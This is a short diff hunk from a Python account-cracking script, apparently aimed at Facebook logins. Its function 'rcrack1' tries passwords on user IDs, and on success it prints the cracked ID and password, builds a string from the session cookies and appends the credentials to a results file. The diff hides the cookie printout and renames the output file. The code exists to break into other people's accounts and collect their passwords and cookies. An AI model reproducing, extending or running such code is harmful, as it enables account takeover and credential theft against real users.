@@ -572,9 +572,9 @@ def rcrack1(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[7:22]
 				print('\33[1;92m[UBAID-OK] '+uid+' √ '+ps+'\33[0;97m')
-				print('%s[%sCOOKIE%s] : %s%s ' % (W,Y,W,G,coki))
+				#print('%s[%sCOOKIE%s] : %s%s ' % (W,Y,W,G,coki))
 				
-				open('USMAN-OK.txt', 'a').write(uid+' √ '+ps+'\n')
+				open('OK.txt', 'a').write(uid+' √ '+ps+'\n')
 				oks.append(uid);
 				break
 			elif 'checkpoint' in log_cookies:
